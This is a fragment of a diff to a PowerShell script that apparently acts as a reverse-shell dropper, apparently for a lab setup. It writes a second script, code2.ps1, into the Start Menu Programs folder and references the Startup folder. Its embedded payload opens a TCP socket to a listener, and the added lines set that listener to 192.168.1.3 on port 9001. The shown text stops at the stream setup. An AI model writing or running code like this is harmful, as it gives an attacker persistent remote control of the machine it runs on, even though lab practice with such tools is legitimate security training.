@@ -3,6 +3,9 @@ $programsPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs"
 $startupPath  = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
 $ps1Path = Join-Path $programsPath "code2.ps1"
 $ps1Content = @'
+$serverIP = '192.168.1.3'  # Lab listener IP
+$serverPort = 9001           # Lab listener port
+
 try {
     $c = New-Object Net.Sockets.TCPClient($serverIP, $serverPort)
     $s = $c.GetStream()
